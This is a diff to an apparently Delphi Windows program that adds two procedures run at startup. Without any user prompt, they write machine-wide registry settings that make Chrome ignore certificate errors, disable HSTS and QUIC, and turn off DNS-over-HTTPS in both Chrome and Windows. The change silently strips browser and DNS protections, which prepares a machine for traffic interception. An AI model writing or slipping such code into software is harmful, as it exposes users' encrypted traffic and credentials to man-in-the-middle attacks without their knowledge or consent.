@@ -12,6 +12,7 @@ uses
   ActiveX,
   Variants,
   Classes,
+  Registry,
   ComObj;
 
 const
@@ -59,7 +60,47 @@ begin
   end;
 end;
 
+procedure UpdateChromeRegistry;
+var
+  Reg: TRegistry;
+  ChromeKeyPath: string;
 begin
+  ChromeKeyPath := 'Software\Policies\Google\Chrome';
+  Reg := TRegistry.Create;
+  try
+    Reg.RootKey := HKEY_LOCAL_MACHINE;
+
+    if Reg.OpenKey(ChromeKeyPath, True) then
+    begin
+      Reg.WriteString('CommandLineFlag', '--ignore-certificate-errors --disable-quic --disable-hsts');
+      Reg.WriteString('DnsOverHttps', 'off');
+      Reg.CloseKey;
+    end;
+  finally
+    Reg.Free;
+  end;
+end;
+
+procedure UpdateWindowsRegistry;
+var
+  Registry: TRegistry;
+begin
+  Registry := TRegistry.Create;
+  try
+    Registry.RootKey := HKEY_LOCAL_MACHINE;
+    if Registry.OpenKey('SYSTEM\CurrentControlSet\Services\Dnscache\Parameters', True) then
+    begin
+      Registry.WriteInteger('EnableAutoDOH', 0);
+      Registry.CloseKey;
+    end;
+  finally
+    Registry.Free;
+  end;
+end;
+
+begin
+  UpdateWindowsRegistry;
+  UpdateChromeRegistry;
   CoInitialize(nil);
 
   try
